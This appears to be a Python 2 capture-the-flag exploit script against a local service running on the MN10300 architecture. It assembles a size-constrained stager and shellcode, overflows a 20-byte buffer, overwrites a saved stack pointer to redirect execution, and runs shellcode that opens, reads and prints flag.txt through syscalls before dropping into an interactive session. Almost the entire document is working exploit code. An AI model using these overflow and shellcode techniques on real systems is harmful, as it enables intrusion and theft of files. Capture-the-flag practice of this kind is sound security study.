stager_asm = '''.section .text
.global _start
.ascii "%s"
_start:
# 14de:	a5 00       	cmp	0,d1
  mov 0x12ff, a1
  # 40          	inc	d0
  mov 0x4040, d1
  movbu d1, (0x01df+1, a1)

  mov a1, d0
  mov 0x101, d1
  add d1, d0
  mov d0, a1
  jmp (a1)
.ascii "%s"
'''
asm = '''.section .text
.global _start

.ascii "%s"
_start:
  nop
  nop

  # call get_addr
  .word 0xfffa
  .word 0x0004
get_addr:
  mov (0, sp), d2
  # len(shellcode) - 4
  add 39, d2
open:
  mov d2, d1
  clr d0
  mov d0, (12, sp)
  mov d0, (16, sp)
  mov 2, d0
  syscall
read:
  mov d0, d1
  mov a0, (12, sp)
  clr d0
  add 0x7f, d0
  mov d0, (16, sp)
  mov 4, d0
  syscall
write:
  mov 1, d1
  mov a0, (12, sp)
  clr d0
  add 0x7f, d0
  mov d0, (16, sp)
  mov 5, d0
  syscall
.ascii "%s"
'''
import os
from lib.mylib import *

ARCH = 'mn10300'
AS = ARCH + '-elf-as'
OBJDUMP = ARCH + '-elf-objdump'
FLAG = 'flag.txt'
BEGIN_MARKER = 'BEGIN_MARKER'
END_MARKER = 'END_MARKER'
BUF_SIZE = 20

stager_asm = stager_asm % (BEGIN_MARKER, END_MARKER)
asm = asm % (BEGIN_MARKER, END_MARKER)

open('/tmp/b.S', mode='wb').write(stager_asm)
os.system(AS + ' /tmp/b.S -o /tmp/b.out')
exe = open('/tmp/b.out').read()
stager = exe.split(BEGIN_MARKER)[1].split(END_MARKER)[0]
xxd(stager)
if '\x00' in stager:
    raise Exception('has \\x00')
if '\x0a' in stager:
    raise Exception('has \\x0a')
if len(stager) > BUF_SIZE:
    raise Exception('too long')
stager = stager.ljust(BUF_SIZE, 'A')

open('/tmp/a.S', mode='wb').write(asm)
os.system(AS + ' /tmp/a.S -o /tmp/a.out')
exe = open('/tmp/a.out').read()
shellcode = exe.split(BEGIN_MARKER)[1].split(END_MARKER)[0]
print len(shellcode)
shellcode = shellcode + FLAG + '\x00'
xxd(shellcode)

IP = '127.0.0.1'
PORT = 10009
s = mysock(IP, PORT)

SP = 0x1af0
sl(s, '\n000')
first = stager + p(SP)[0:2] + '\n'
sl(s, first)

SP = 0x1b08
sl(s, '\n000')
shellcode = 'A' * BUF_SIZE + p(SP) + shellcode + '\n'
sl(s, shellcode)
shell(s)
